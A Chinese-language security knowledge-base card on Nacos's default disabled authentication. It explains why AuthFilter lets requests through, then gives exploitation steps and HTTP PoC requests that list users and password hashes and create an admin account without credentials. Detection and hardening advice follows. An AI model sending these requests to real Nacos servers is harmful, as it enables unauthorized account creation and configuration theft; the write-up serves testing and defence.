---
id: web-java-component-nacos-default-auth-disabled-user-admin
title: Nacos 默认配置 nacos.core.auth.enabled=false：未授权访问 v1/auth/users 枚举/新建用户并登录控制台
type: scenario
domain: web
path: web/java/component
technique: nacos-default-auth-disabled-unauth-user-api
tags:
- nacos
- java
- auth-bypass
- default-config
- unauthorized-access
- component
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:05:38+08:00'
  notes: 已对照原文与全部35张图核对：默认nacos.core.auth.enabled=false（图06）、isAuthEnabled缺省false（图07）、AuthFilter首判断放行（图08）、GET v1/auth/users枚举（图03）、POST创建用户回显create user ok（图04）、test1登录控制台（图05）、开启后403 unknown user（图09）均一致。原文以2.0.0-ALPHA.1 standalone验证；未设affected_versions（默认配置非版本区间）。
url: /docs/web/java/component/web-java-component-nacos-default-auth-disabled-user-admin/
draft: false
kb_aliases:
- Nacos 默认未授权访问
- nacos.core.auth.enabled=false
- Nacos v1/auth/users 未授权
- Nacos 默认配置登录
- Nacos AuthFilter 跳过鉴权
---

## 一句话结论

Nacos 默认配置 `nacos.core.auth.enabled=false`：`AuthConfigs.isAuthEnabled()` 返回 false，`core/auth/AuthFilter.doFilter` 在第一个判断就直接 `chain.doFilter` 放行，所有 `/nacos/v1/auth/users` 等管理接口无需任何身份标识即可访问；攻击者可枚举用户与 BCrypt 口令、直接 `POST` 新建用户，再用新账号登录控制台。这与 CVE-2021-29441 的 User-Agent 绕过不是同一问题，根因只是默认没开鉴权。

## 原理

- `AuthConfigs.isAuthEnabled()` 读取配置 `nacos.core.auth.enabled`，代码中缺省值为 `false`（`BooleanUtils.toBoolean(EnvUtil.getProperty("nacos.core.auth.enabled", "false"))`）。
- `core/src/main/java/com/alibaba/nacos/core/auth/AuthFilter.java#doFilter` 的第一段逻辑是 `if (!authConfigs.isAuthEnabled()) { chain.doFilter(request, response); return; }`。鉴权关闭时，过滤器直接放行到后续 FilterChain，不检查 accessToken、User-Agent、serverIdentity 等任何凭据。
- 因此 `/nacos/v1/auth/users?pageNo=1&pageSize=1` 这类管理 API 未授权可达，返回用户列表（含 BCrypt 哈希）；`POST /nacos/v1/auth/users` 可直接创建新用户，随后用新账号登录 `localhost:8848/nacos/`。
- 之所以成立：这是“默认为方便部署而关闭安全开关”的产品设计问题，不是某个解析/校验绕过；只要部署者没有显式把 `nacos.core.auth.enabled` 改为 `true`，Nacos 的管理面就是完全开放的。
- 边界：开启鉴权后该接口会返回 403/Whitelabel Error（`unknown user!`），但若同时保留默认 JWT 密钥或弱 serverIdentity，仍可能被其它方式绕过；因此“开启鉴权”只是第一步。

## 触发条件

- 目标 Nacos 使用默认配置启动，`nacos.core.auth.enabled` 未设为 `true`（或显式设置为 `false`）。
- Nacos 控制台/8848 端口或反代路径 `/nacos` 可从攻击者网络访问。
- 使用 standalone 或集群模式均可，只要未开启鉴权；原文以 2.0.0-ALPHA.1 standalone 验证。
- 仅用于授权测试。

## 利用步骤

1. 发现 Nacos：访问 `http://target:8848/nacos/` 或扫描 8848/控制台路径。
2. 直接请求用户列表：`GET /nacos/v1/auth/users?pageNo=1&pageSize=1`，若返回 `totalCount`/`pageItems`（含 username/password 哈希）则确认未授权。
3. 新建账号：`POST /nacos/v1/auth/users`，表单 `username=test1&password=test1`，成功返回 `"code":200,"message":"create user ok!"`。
4. 用新账号登录控制台（`/nacos/#/login`），即可读取/修改配置、服务列表等。
5. 若目标是集群且开启了鉴权，检查是否同时存在默认 JWT 密钥或 serverIdentity 弱配置（见关联卡）。
6. 记录请求与响应作为证据；不要在未授权目标上创建账号。

## PoC

```http
GET /nacos/v1/auth/users?pageNo=1&pageSize=1 HTTP/1.1
Host: 192.168.250.106:8848
```

```http
POST /nacos/v1/auth/users HTTP/1.1
Host: 192.168.250.106:8848
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=test1&password=test1
```

成功回显：

```json
{"code":200,"message":"create user ok!","data":null}
```

登入后控制台可见配置管理/服务管理等菜单。开启 `nacos.core.auth.enabled=true` 后，同一请求回显 `Whitelabel Error Page ... status=403 ... unknown user!`。

## 变体与关联

- **默认 JWT 密钥**：即使开启鉴权，若 `nacos.core.auth.default.token.secret.key` 仍为默认值，可伪造 HS256 accessToken 绕过，见 [[web-java-component-nacos-default-token-secret-key-jwt-forge]]。
- **请求头白名单绕过**：`serverIdentity` 或 `User-Agent: Nacos-Server` 配置不当时可跳过 JWT 校验，见 [[web-java-component-nacos-server-identity-header-auth-bypass]]。
- **路径解析绕过**：`/v1/auth/users/` 末尾斜杠可使 `ControllerMethodsCache` 取不到 method 而放行，见 [[web-java-component-nacos-authfilter-trailing-slash-uri-lookup-bypass]]。
- **加密数据库接口**：同一默认配置下 Derby 运维接口未授权（CVE-2021-29442），见 [[web-java-component-nacos-derby-ops-unauth-sqli-user-dump]]。
- **横向利用**：拿到控制台后读取配置中心的数据库/对象存储凭据，见 [[pentest-lateral-movement-nacos-ua-bypass-config-minio-credentials]]、[[cloud-cloud-iam-nacos-config-aliyun-ak-sk-oss-takeover]]。

## 检测与防御

- **检测**：Nacos 访问日志中出现对 `/nacos/v1/auth/users` 的 GET/POST，且无 accessToken 或 login 会话；短时间内新增用户；从非管理网段访问 8848。
- **防御**：在 `application.properties` 中显式设置 `nacos.core.auth.enabled=true` 与 `nacos.core.auth.system.type=nacos`；同时修改默认 JWT 密钥、关闭 `enable.userAgentAuthWhite`、自定义 serverIdentity；不要把 Nacos 暴露公网，使用内网/白名单/VPN。
- **验证**：修改后重放用户列表请求，应返回 403 `unknown user!`；检查集群每个节点配置一致（鉴权开关改后即时生效，无需重启，但密钥需各节点一致）。
